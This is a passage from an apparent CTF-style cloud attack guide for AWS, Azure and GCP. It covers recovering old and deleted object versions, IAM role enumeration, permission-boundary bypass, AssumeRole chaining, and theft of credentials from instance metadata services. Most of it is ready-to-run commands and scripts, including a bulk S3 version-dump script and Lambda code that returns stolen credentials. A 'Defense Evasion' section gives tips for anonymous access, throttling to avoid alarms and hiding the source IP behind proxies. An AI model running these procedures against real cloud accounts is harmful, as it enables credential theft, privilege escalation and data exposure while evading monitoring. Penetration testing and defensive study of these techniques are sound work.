Invoke-EnumerateAzureBlobs -Base company-name

# Check for public storage accounts
Get-AzureStorageAccount | Where-Object {$_.EnableHttpsTrafficOnly -eq $false}
```

## Object Versioning Exploitation

Many cloud storage services maintain previous versions of objects. Misconfigurations or lack of proper access controls on versioned objects can expose sensitive historical data.

### AWS S3 Versioning Attacks

**Check if Versioning is Enabled:**

```bash
# Check bucket versioning status
aws s3api get-bucket-versioning --bucket target-bucket

# Output examples:
# {"Status": "Enabled"} - versioning active
# {"Status": "Suspended"} - versioning was enabled, objects retain versions
# No output or empty - versioning never enabled
```

**Enumerate Object Versions:**

```bash
# List all versions of all objects
aws s3api list-object-versions --bucket target-bucket

# List versions of specific object
aws s3api list-object-versions \
  --bucket target-bucket \
  --prefix "path/to/object.txt"

# Output includes VersionId for each version
# Example response structure:
{
  "Versions": [
    {
      "Key": "secret.txt",
      "VersionId": "3HL4kqtJlcpXroDTDmJ+rmSpXd3dIbrHY",
      "IsLatest": true,
      "LastModified": "2024-10-20T12:00:00Z"
    },
    {
      "Key": "secret.txt",
      "VersionId": "QUpfdndhfd8438DJDNF3jf9JFJjf",
      "IsLatest": false,
      "LastModified": "2024-10-15T08:30:00Z"
    }
  ]
}
```

**Download Previous Versions:**

```bash
# Download specific version
aws s3api get-object \
  --bucket target-bucket \
  --key secret.txt \
  --version-id "QUpfdndhfd8438DJDNF3jf9JFJjf" \
  old-version-secret.txt

# Automated version extraction
aws s3api list-object-versions --bucket target-bucket \
  | jq -r '.Versions[] | "\(.Key) \(.VersionId)"' \
  | while read key version; do
      aws s3api get-object \
        --bucket target-bucket \
        --key "$key" \
        --version-id "$version" \
        "versions/${key}_${version}"
    done
```

**Delete Markers Exploitation:**

```bash
# List delete markers (objects marked as deleted but versions retained)
aws s3api list-object-versions --bucket target-bucket \
  | jq '.DeleteMarkers'

# Recover "deleted" files by removing delete marker
aws s3api delete-object \
  --bucket target-bucket \
  --key recovered-file.txt \
  --version-id "delete-marker-version-id"

# This exposes the previous version
```

**Version-Specific Access Control Testing:**

```bash
# Current object may have restricted access
# Previous versions might have different ACLs

# Check ACL of specific version
aws s3api get-object-acl \
  --bucket target-bucket \
  --key object.txt \
  --version-id "old-version-id"

# Download if old version has weaker permissions
aws s3api get-object \
  --bucket target-bucket \
  --key object.txt \
  --version-id "old-version-id" \
  output.txt \
  --no-sign-request
```

### Azure Blob Versioning

```bash
# Check if versioning is enabled
az storage account blob-service-properties show \
  --account-name targetaccount \
  --query "isVersioningEnabled"

# List blob versions
az storage blob list \
  --account-name targetaccount \
  --container-name container \
  --include v \
  --auth-mode login

# Download specific version
az storage blob download \
  --account-name targetaccount \
  --container-name container \
  --name blob.txt \
  --version-id "2024-10-20T12:00:00.0000000Z" \
  --file old-blob.txt
```

### Google Cloud Storage Versioning

```bash
# Check if versioning enabled
gsutil versioning get gs://bucket-name

# List object versions
gsutil ls -a gs://bucket-name/object.txt

# Download specific generation
gsutil cp gs://bucket-name/object.txt#1634567890123456 ./old-version.txt

# Restore old version
gsutil cp gs://bucket-name/object.txt#1634567890123456 gs://bucket-name/object.txt
```

### Automated Versioning Enumeration Script

```bash
#!/bin/bash
# s3-version-dump.sh - Extract all versions from S3 bucket

BUCKET=$1
OUTPUT_DIR="versions_${BUCKET}_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"

echo "[*] Enumerating versions in bucket: $BUCKET"

aws s3api list-object-versions --bucket "$BUCKET" > "${OUTPUT_DIR}/versions.json"

echo "[*] Extracting version data..."

jq -r '.Versions[] | "\(.Key)|\(.VersionId)|\(.LastModified)"' "${OUTPUT_DIR}/versions.json" > "${OUTPUT_DIR}/version_list.txt"

echo "[*] Downloading all versions..."

while IFS='|' read -r key version_id modified; do
  safe_key=$(echo "$key" | tr '/' '_')
  output_file="${OUTPUT_DIR}/${safe_key}_${version_id}"
  
  echo "[+] Downloading: $key (Version: $version_id, Modified: $modified)"
  
  aws s3api get-object \
    --bucket "$BUCKET" \
    --key "$key" \
    --version-id "$version_id" \
    "$output_file" 2>/dev/null
    
  if [ $? -eq 0 ]; then
    echo "    [SUCCESS] Saved to: $output_file"
  else
    echo "    [FAILED] Access denied or error"
  fi
done < "${OUTPUT_DIR}/version_list.txt"

echo "[*] Version dump complete. Output directory: $OUTPUT_DIR"
```

**Usage:**

```bash
chmod +x s3-version-dump.sh
./s3-version-dump.sh target-bucket-name
```

### Version Exploitation Strategy

**Typical Attack Workflow:**

1. **Discovery**: Identify bucket with versioning enabled
2. **Enumeration**: List all object versions using `list-object-versions`
3. **Permission Testing**: Check if older versions have weaker ACLs
4. **Historical Data Mining**: Download all versions looking for:
    - Accidentally committed credentials
    - Configuration files with old passwords
    - Source code with vulnerabilities
    - Sensitive data that was "deleted"
5. **Delete Marker Recovery**: Undelete objects by removing delete markers

**Common Scenarios:**

- Developer commits AWS keys to config file, then "deletes" file → old version still accessible
- Company removes sensitive document from bucket → delete marker present, original version retrievable
- Object permissions tightened on current version → old versions retain public access
- Backup files with `_old` or `_backup` suffixes retain older versions with sensitive data

### Defense Evasion Considerations

[Inference] When exploiting cloud storage in CTF scenarios, standard detection mechanisms include CloudTrail logging (AWS), Activity Logs (Azure), and Cloud Audit Logs (GCP). Enumeration and download activities generate events, though detection depends on proper logging configuration and monitoring.

**Operational Tips:**

```bash
# Use --no-sign-request for anonymous access (no attribution)
aws s3 cp s3://bucket/file.txt . --no-sign-request

# Throttle requests to avoid rate-limiting alarms
for file in $(cat files.txt); do
  aws s3 cp "s3://bucket/${file}" .
  sleep 5
done

# Use proxies or VPNs to obscure source IP
# Configure AWS CLI to use proxy
export HTTP_PROXY=http://proxy:8080
export HTTPS_PROXY=http://proxy:8080
```

---

**Related Topics for Deep Dive**

For comprehensive cloud exploitation capabilities, consider studying:

- **IAM Policy Exploitation**: Privilege escalation through policy manipulation
- **Metadata Service Attacks**: SSRF to instance metadata endpoints (169.254.169.254)
- **Cloud Function/Lambda Exploitation**: Serverless injection and persistence
- **CloudTrail/Logging Evasion**: Anti-forensics in cloud environments

---

# IAM & Privilege Escalation

## Role Enumeration

Role enumeration is the systematic discovery and analysis of IAM roles, their permissions, and relationships within a cloud environment to identify privilege escalation vectors.

### AWS Role Enumeration

**Core Enumeration Commands:**

```bash
# List all roles in the account
aws iam list-roles

# Get detailed role information
aws iam get-role --role-name <role-name>

# List policies attached to a role
aws iam list-attached-role-policies --role-name <role-name>

# List inline policies for a role
aws iam list-role-policies --role-name <role-name>

# Get inline policy document
aws iam get-role-policy --role-name <role-name> --policy-name <policy-name>

# Get managed policy version
aws iam get-policy-version --policy-arn <policy-arn> --version-id <version-id>
```

**Trust Relationship Analysis:**

```bash
# Extract trust policy from role
aws iam get-role --role-name <role-name> --query 'Role.AssumeRolePolicyDocument'

# Check which principals can assume the role
aws iam get-role --role-name <role-name> | jq '.Role.AssumeRolePolicyDocument.Statement[].Principal'
```

**Automated Enumeration Tools:**

```bash
# Using enumerate-iam (identifies available permissions)
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam
./enumerate-iam.py --access-key <key> --secret-key <secret>

# Using ScoutSuite for comprehensive role analysis
scout suite aws --no-browser --report-dir ./scout-report

# Using Pacu for role enumeration
pacu
run iam__enum_permissions
run iam__enum_roles
run iam__bruteforce_permissions
```

**Key Enumeration Targets:**

- Roles with `sts:AssumeRole` permissions
- Roles attachable to EC2 instances (`ec2.amazonaws.com` in trust policy)
- Roles with wildcard permissions (`*`)
- Roles with `iam:PassRole` capability
- Cross-account roles (external account IDs in trust policies)
- Service-linked roles

**Permission Mapping Technique:**

```bash
# Test individual permissions against a role
aws sts assume-role --role-arn <role-arn> --role-session-name test

# Use temporary credentials to enumerate permissions
export AWS_ACCESS_KEY_ID=<temp-key>
export AWS_SECRET_ACCESS_KEY=<temp-secret>
export AWS_SESSION_TOKEN=<temp-token>

# Test specific actions
aws iam list-users
aws s3 ls
aws ec2 describe-instances
```

### Azure Role Enumeration

**Azure Role Discovery:**

```bash
# List all role assignments for subscription
az role assignment list --all

# Get role definition details
az role definition list --name "Contributor"

# List custom roles
az role definition list --custom-role-only true

# Get service principal roles
az ad sp list --all --query "[].{Name:displayName, AppId:appId}"

# Check role assignments for specific principal
az role assignment list --assignee <object-id>
```

**Managed Identity Enumeration:**

```bash
# From inside Azure VM, query metadata service
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# List VMs with managed identities
az vm identity show --name <vm-name> --resource-group <rg-name>

# Get managed identity permissions
az role assignment list --assignee <managed-identity-principal-id>
```

**Azure AD Role Enumeration:**

```bash
# List directory roles
az ad sp list --all --query "[].{Name:displayName, Roles:appRoles[].value}"

# Using AzureHound for comprehensive enumeration
azurehound -u <username> -p <password> -t <tenant-id> list --all

# Using ROADtools
roadrecon auth -u <username> -p <password>
roadrecon gather
roadrecon gui
```

### GCP Role Enumeration

**GCP IAM Enumeration:**

```bash
# List all IAM policies
gcloud projects get-iam-policy <project-id>

# List service accounts
gcloud iam service-accounts list

# Get service account IAM policy
gcloud iam service-accounts get-iam-policy <sa-email>

# List roles granted to a member
gcloud projects get-iam-policy <project-id> --flatten="bindings[].members" --filter="bindings.members:<member>"

# List custom roles
gcloud iam roles list --project=<project-id>

# Describe specific role
gcloud iam roles describe <role-name>
```

**Service Account Key Enumeration:**

```bash
# List keys for service account
gcloud iam service-accounts keys list --iam-account=<sa-email>

# Test service account permissions
gcloud auth activate-service-account --key-file=<key-file>
gcloud projects get-iam-policy <project-id>
```

## Permission Boundary Bypass

Permission boundaries set maximum permissions that an IAM entity can have, but misconfigurations can allow bypasses.

### AWS Permission Boundary Analysis

**Understanding Permission Boundaries:**

Permission boundaries use managed policies to define the maximum permissions. The effective permissions are the intersection of identity-based policies AND permission boundaries.

```bash
# Check if a user/role has a permission boundary
aws iam get-user --user-name <user-name> | jq '.User.PermissionsBoundary'
aws iam get-role --role-name <role-name> | jq '.Role.PermissionsBoundary'

# Get permission boundary policy content
aws iam get-policy --policy-arn <boundary-arn>
aws iam get-policy-version --policy-arn <boundary-arn> --version-id <version-id>
```

**Common Bypass Vectors:**

**1. Missing Boundary on New Entity Creation:**

If IAM permissions allow creating users/roles without applying boundaries:

```bash
# Create user without boundary (if iam:CreateUser allowed but no boundary enforcement)
aws iam create-user --user-name bypass-user

# Attach admin policy
aws iam attach-user-policy --user-name bypass-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access keys
aws iam create-access-key --user-name bypass-user
```

**2. Permission Boundary Modification:**

```bash
# Check if you can delete permission boundaries
aws iam delete-user-permissions-boundary --user-name <user>

# Check if you can modify the boundary policy itself
aws iam create-policy-version --policy-arn <boundary-arn> --policy-document file://permissive-policy.json --set-as-default
```

**3. PassRole to Service Without Boundary:**

```bash
# Pass role to Lambda without boundary enforcement
aws lambda create-function \
  --function-name privesc-function \
  --runtime python3.9 \
  --role arn:aws:iam::<account>:role/HighPrivilegeRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip

# Invoke function to execute with higher privileges
aws lambda invoke --function-name privesc-function output.txt
```

**4. Service-Specific Boundary Gaps:**

[Inference] Some AWS services may not enforce permission boundaries consistently. Testing required for specific services.

```bash
# CloudFormation role passing
aws cloudformation create-stack \
  --stack-name privesc-stack \
  --template-body file://template.yaml \
  --role-arn arn:aws:iam::<account>:role/HighPrivilegeRole

# CodeBuild project creation
aws codebuild create-project \
  --name privesc-build \
  --service-role arn:aws:iam::<account>:role/HighPrivilegeRole \
  --source type=NO_SOURCE \
  --artifacts type=NO_ARTIFACTS \
  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:5.0,computeType=BUILD_GENERAL1_SMALL
```

### Azure Permission Boundary Equivalents

Azure uses resource locks and policy assignments rather than explicit permission boundaries:

**Azure Policy Bypass Techniques:**

```bash
# Check applied policies
az policy assignment list --resource-group <rg>

# Test policy exemptions
az policy exemption create \
  --name test-exemption \
  --policy-assignment <assignment-id> \
  --exemption-category Waiver

# Check for management group hierarchy gaps
az account management-group list
az account management-group show --name <mg-name>
```

**Azure RBAC Deny Assignments:**

```bash
# List deny assignments (rare, mostly system-managed)
az role assignment list --all --query "[?type=='Microsoft.Authorization/denyAssignments']"

# Attempt privileged operations outside deny scope
az resource create --resource-type <type> --name <name> --resource-group <different-rg>
```

### GCP Organization Policy Bypass

**Policy Constraint Analysis:**

```bash
# List organization policies
gcloud resource-manager org-policies list --project=<project-id>

# Describe specific constraint
gcloud resource-manager org-policies describe <constraint> --project=<project-id>

# Test if policies apply at folder vs project level
gcloud resource-manager org-policies describe <constraint> --folder=<folder-id>
```

**Bypass Through Project Creation:**

```bash
# Create new project outside policy scope
gcloud projects create <new-project-id> --folder=<folder-id>

# Check if policies inherited
gcloud resource-manager org-policies list --project=<new-project-id>
```

## AssumeRole Exploitation

AssumeRole allows principals to temporarily gain permissions of another role through STS token generation.

### AWS AssumeRole Attack Chains

**Basic AssumeRole Exploitation:**

```bash
# Assume role with basic trust relationship
aws sts assume-role \
  --role-arn arn:aws:iam::<account>:role/<role-name> \
  --role-session-name exploit-session

# Extract and export credentials
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>

# Verify assumed identity
aws sts get-caller-identity
```

**AssumeRole Chaining:**

```bash
# Chain through multiple roles for privilege escalation
# Role A -> Role B -> Role C (admin)

# Step 1: Assume Role A
aws sts assume-role --role-arn arn:aws:iam::111111111111:role/RoleA --role-session-name step1

# Step 2: Use Role A credentials to assume Role B
export AWS_ACCESS_KEY_ID=<RoleA-Key>
export AWS_SECRET_ACCESS_KEY=<RoleA-Secret>
export AWS_SESSION_TOKEN=<RoleA-Token>

aws sts assume-role --role-arn arn:aws:iam::222222222222:role/RoleB --role-session-name step2

# Step 3: Continue chain
export AWS_ACCESS_KEY_ID=<RoleB-Key>
export AWS_SECRET_ACCESS_KEY=<RoleB-Secret>
export AWS_SESSION_TOKEN=<RoleB-Token>

aws sts assume-role --role-arn arn:aws:iam::333333333333:role/AdminRole --role-session-name final
```

**Cross-Account AssumeRole:**

```bash
# Assume role in different account
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/CrossAccountRole \
  --role-session-name cross-account-session \
  --external-id <external-id-if-required>

# Enumerate cross-account trust relationships
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS]].{RoleName:RoleName,TrustedAccounts:AssumeRolePolicyDocument.Statement[].Principal.AWS}'
```

**Confused Deputy Exploitation:**

When a service is trusted to assume roles, you can abuse that service to assume roles on your behalf:

```bash
# Example: Lambda confused deputy
# Create Lambda with execution role that can assume target role
aws lambda create-function \
  --function-name assume-role-proxy \
  --runtime python3.9 \
  --role arn:aws:iam::<account>:role/LambdaExecutionRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://assume_role.zip

# Lambda code (assume_role.zip):
```

```python
import boto3
import json

def lambda_handler(event, context):
    sts = boto3.client('sts')
    response = sts.assume_role(
        RoleArn='arn:aws:iam::<account>:role/TargetRole',
        RoleSessionName='confused-deputy-session'
    )
    return {
        'statusCode': 200,
        'body': json.dumps(response['Credentials'])
    }
```

```bash
# Invoke to get target role credentials
aws lambda invoke --function-name assume-role-proxy output.json
cat output.json
```

**AssumeRole with MFA Bypass:**

If MFA is required but not properly enforced:

```bash
# Check MFA requirements in trust policy
aws iam get-role --role-name <role> | jq '.Role.AssumeRolePolicyDocument.Statement[].Condition'

# Attempt assume-role without MFA if condition checking is flawed
aws sts assume-role --role-arn <role-arn> --role-session-name test

# If MFA required, try with session token from different authentication
aws sts assume-role \
  --role-arn <role-arn> \
  --role-session-name test \
  --serial-number arn:aws:iam::<account>:mfa/<user> \
  --token-code <mfa-code>
```

**AssumeRoleWithWebIdentity Exploitation:**

```bash
# Abuse OIDC provider trust
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::<account>:role/WebIdentityRole \
  --role-session-name web-session \
  --web-identity-token <jwt-token>

# Enumerate OIDC providers
aws iam list-open-id-connect-providers

# Get OIDC provider details
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <oidc-arn>
```

### Azure Role Assignment Exploitation

**Azure Service Principal AssumeRole Equivalent:**

```bash
# Authenticate as service principal
az login --service-principal \
  -u <app-id> \
  -p <password-or-cert> \
  --tenant <tenant-id>

# Get access token for different resource
az account get-access-token --resource https://graph.microsoft.com

# Use token with REST API
curl -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/me
```

**Managed Identity Token Acquisition:**

```bash
# From Azure VM/App Service
curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Specify user-assigned managed identity
curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<client-id>"

# Get token for different resource (e.g., Key Vault)
curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
```

**Azure Role Assignment Through Resource Creation:**

```bash
# Create resource with contributor role to gain permissions
az vm create \
  --name privesc-vm \
  --resource-group <rg> \
  --image UbuntuLTS \
  --assign-identity \
  --role Contributor \
  --scope /subscriptions/<subscription-id>

# Access VM and use managed identity
ssh azureuser@<vm-ip>
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### GCP Service Account Impersonation Setup

**Basic Service Account Token Generation:**

```bash
# Generate access token for service account
gcloud auth activate-service-account --key-file=<key-file>

# Get access token
gcloud auth print-access-token

# Generate ID token
gcloud auth print-identity-token
```

**Service Account Key Creation (Privilege Escalation):**

```bash
# If you have iam.serviceAccountKeys.create permission
gcloud iam service-accounts keys create key.json \
  --iam-account=<sa-email>

# Activate and use
gcloud auth activate-service-account --key-file=key.json
```

**ActAs Permission Exploitation:**

```bash
# Check if you can impersonate service account
gcloud iam service-accounts get-iam-policy <sa-email> \
  --filter="bindings.role:roles/iam.serviceAccountUser"

# Generate access token for impersonated account
gcloud auth print-access-token --impersonate-service-account=<sa-email>

# Use impersonated credentials for operations
gcloud projects get-iam-policy <project-id> \
  --impersonate-service-account=<sa-email>
```

## Service Account Impersonation

Service account impersonation allows one principal to act as another service account, effectively gaining its permissions.

### AWS Service Account Impersonation Patterns

AWS doesn't use "service accounts" in the traditional sense, but EC2 instance profiles and Lambda execution roles serve similar functions.

**EC2 Instance Metadata Abuse:**

```bash
# From compromised EC2 instance
# Query instance metadata for IAM role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get role name
ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Retrieve temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# Export credentials
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>
```

**IMDSv2 Token-Based Access:**

```bash
# Get session token first (required for IMDSv2)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token to access metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials with token
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```

**Lambda Execution Role Extraction:**

```bash
# From within Lambda function
# Environment variables contain credentials
echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY
echo $AWS_SESSION_TOKEN

# Python code to exfiltrate credentials
import os
import json

def lambda_handler(event, context):
    creds = {
        'access_key': os.environ['AWS_ACCESS_KEY_ID'],
        'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],
        'session_token': os.environ['AWS_SESSION_TOKEN']
    }
    return {
        'statusCode': 200,
        'body': json.dumps(creds)
    }
```

**ECS Task Role Credential Theft:**

```bash
# From within ECS container
# Get credentials URI from environment
curl $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# Full request
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

### Azure Managed Identity Impersonation

**System-Assigned Managed Identity Exploitation:**

```bash
# From compromised Azure VM
# Get access token
TOKEN=$(curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r '.access_token')

# Use token for Azure API calls
curl -H "Authorization: Bearer $TOKEN" \
  https://management.azure.com/subscriptions?api-version=2020-01-01

# Get token for different resources
# Azure Resource Manager
TOKEN_ARM=$(curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r '.access_token')

# Microsoft Graph
TOKEN_GRAPH=$(curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" \
  | jq -r '.access_token')

# Azure Key Vault
TOKEN_KV=$(curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | jq -r '.access_token')
```

**User-Assigned Managed Identity Targeting:**

```bash
# Specify client_id or object_id for user-assigned identity
curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<client-id>" \
  | jq -r '.access_token'

# Or using object_id
curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&object_id=<object-id>" \
  | jq -r '.access_token'
```

**App Service Managed Identity:**

```bash
# From App Service environment
# Get endpoint and secret from environment variables
curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/"

# Extract and use token
TOKEN=$(curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/" \
  | jq -r '.access_token')

curl -H "Authorization: Bearer $TOKEN" \
  https://management.azure.com/subscriptions?api-version=2020-01-01
```

**Azure Automation Runbook Identity:**

```PowerShell
# From Azure Automation runbook
# Get automation connection
$connection = Get-AutomationConnection -Name AzureRunAsConnection

# Authenticate
Connect-AzAccount `
  -ServicePrincipal `
  -Tenant $connection.TenantID `
  -ApplicationId $connection.ApplicationID `
  -CertificateThumbprint $connection.CertificateThumbprint

# Execute privileged operations
Get-AzResource
Get-AzKeyVault
```

### GCP Service Account Impersonation

**Direct Service Account Impersonation:**

```bash
# Using generateAccessToken API
gcloud auth print-access-token \
  --impersonate-service-account=<sa-email>

# Generate ID token
gcloud auth print-identity-token \
  --impersonate-service-account=<sa-email>

# Use impersonation for gcloud commands
gcloud compute instances list \
  --impersonate-service-account=<sa-email>

# Use with gsutil
gsutil -i <sa-email> ls gs://<bucket>
```

**Service Account Key File Creation:**

```bash
# Create new key if you have iam.serviceAccountKeys.create
gcloud iam service-accounts keys create sa-key.json \
  --iam-account=<sa-email>

# Activate service account
gcloud auth activate-service-account <sa-email> \
  --key-file=sa-key.json

# Verify active account
gcloud auth list
gcloud config get-value account

# Use for operations
gcloud projects get-iam-policy <project-id>
```

**Metadata Server Token Extraction (GCE):**

```bash
# From compromised GCE instance
# Get default service account token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Get token for specific service account
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/<sa-email>/token

# Get email of attached service account
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Use extracted token
TOKEN=$(curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
  | jq -r '.access_token')

curl -H "Authorization: Bearer $TOKEN" \
  https://cloudresourcemanager.googleapis.com/v1/projects/<project-id>
```

**Cloud Function Service Account Exploitation:**

```python
# From within Cloud Function
import google.auth
import google.auth.transport.requests
from google.oauth2 import service_account

def function_handler(request):
    # Get default credentials (function's service account)
    credentials, project = google.auth.default()
    
    # Request token
    auth_req = google.auth.transport.requests.Request()
    credentials.refresh(auth_req)
    
    # Return token
    return {
        'token': credentials.token,
        'project': project,
        'service_account': credentials.service_account_email
    }
```

**SignJWT for Custom Token Creation:**

```bash
# If you have iam.serviceAccounts.signJwt permission
# Create JWT payload
cat > payload.json <<EOF
{
  "iss": "<sa-email>",
  "sub": "<sa-email>",
  "aud": "https://oauth2.googleapis.com/token",
  "iat": $(date +%s),
  "exp": $(($(date +%s) + 3600))
}
EOF

# Sign JWT using GCP API
curl -X POST \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d "@payload.json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<sa-email>:signJwt"

# Exchange JWT for access token
curl -X POST \
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
  -d "assertion=<signed-jwt>" \
  https://oauth2.googleapis.com/token
```

**Workload Identity Exploitation (GKE):**

```bash
# From GKE pod with workload identity
# Service account token automatically mounted
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Get GCP token via metadata server
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Kubernetes service account mapped to GCP service account
# Uses format: <k8s-sa-name>@<project-id>.iam.gserviceaccount.com
```

**Service Account Impersonation Chaining:**

```bash
# Chain through multiple service accounts
# SA1 has actAs on SA2, SA2 has actAs on SA3, etc.

# Step 1: Impersonate SA2 using SA1
gcloud auth print-access-token \
  --impersonate-service-account=sa2@project.iam.gserviceaccount.com

# Step 2: Use SA2 token to impersonate SA3
# Set token as default credential
export CLOUDSDK_AUTH_ACCESS_TOKEN=<sa2-token>

gcloud auth print-access-token \
  --impersonate-service-account=sa3@project.iam.gserviceaccount.com

# Continue chain as needed
```

**Critical Permissions for Service Account Impersonation:**

AWS:

- `iam:PassRole` - Pass role to service
- `sts:AssumeRole` - Assume role directly
- `ec2:RunInstances` - Launch instance with role
- `lambda:CreateFunction` - Create Lambda with execution role

Azure:

- `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action` - Assign managed identity
- `Microsoft.Authorization/roleAssignments/write` - Create role assignments
- `Microsoft.Compute/virtualMachines/write` - Create VM with identity

GCP:

- `iam.serviceAccounts.actAs` - Impersonate service account
- `iam.serviceAccountKeys.create` - Create SA keys
- `iam.serviceAccounts.signJwt` - Sign JWTs as SA
- `iam.serviceAccounts.getAccessToken` - Generate access tokens
- `iam.serviceAccounts.implicitDelegation` - Implicit delegation

---

**Related Critical Topics:** Credential harvesting from compute resources, SSRF to metadata services, container escape to host service accounts, Kubernetes RBAC exploitation for cloud identity access.

---

## Policy Misconfiguration

### Understanding IAM Policy Structure

IAM policies define permissions through JSON documents with explicit Allow/Deny statements. Misconfigurations occur when policies grant excessive permissions through overly broad principals, actions, or resources.

**Core Policy Elements:**

- **Principal**: Who can access (users, roles, services)
- **Action**: What operations are permitted
- **Resource**: Which resources the actions apply to
- **Condition**: Optional constraints on when permissions apply

### Common Misconfiguration Patterns

**Wildcard Abuse:**

```json
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```

This grants full administrative access. Search for policies containing `"Action": "*"` or `"Resource": "*"`.

**Overly Permissive Resource Specifications:**

```json
{
  "Effect": "Allow",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::*/*"
}
```

Grants read access to all S3 buckets instead of specific ones.

**PassRole Exploitation:** The `iam:PassRole` permission allows attaching IAM roles to services. When combined with service-specific permissions, this enables privilege escalation:

```bash
# Enumerate your current permissions
aws iam get-user
aws iam list-attached-user-policies --user-name <username>
aws iam get-policy-version --policy-arn <arn> --version-id <version>

# Check for PassRole permission
# Look for "iam:PassRole" in policy documents

# If found, enumerate available roles
aws iam list-roles

# Pass high-privilege role to exploitable service
aws lambda create-function --function-name exploit \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT_ID:role/HighPrivRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://payload.zip
```

**AssumeRole Misconfigurations:** Trust policies that allow assumption from overly broad principals:

```json
{
  "Effect": "Allow",
  "Principal": {"AWS": "*"},
  "Action": "sts:AssumeRole"
}
```

Enumerate assumable roles:

```bash
# List roles
aws iam list-roles

# Examine trust policy
aws iam get-role --role-name <RoleName>

# Attempt assumption
aws sts assume-role --role-arn <arn> --role-session-name exploit

# Use temporary credentials
export AWS_ACCESS_KEY_ID=<from assume-role output>
export AWS_SECRET_ACCESS_KEY=<from assume-role output>
export AWS_SESSION_TOKEN=<from assume-role output>
```

### Enumeration Techniques

**AWS Enumeration:**

```bash
# Identify current identity
aws sts get-caller-identity

# List accessible resources
aws s3 ls
aws ec2 describe-instances
aws lambda list-functions
aws iam list-users
aws iam list-roles

# Enumerate policies for discovered principals
aws iam list-user-policies --user-name <username>
aws iam list-role-policies --role-name <rolename>
aws iam list-attached-user-policies --user-name <username>
aws iam get-policy --policy-arn <arn>
```

**Azure Enumeration:**

```bash
# Authenticate
az login

# Get current context
az account show

# List role assignments
az role assignment list --assignee <object-id>
az role assignment list --all

# Enumerate service principals
az ad sp list --all

# Check specific resource permissions
az resource list
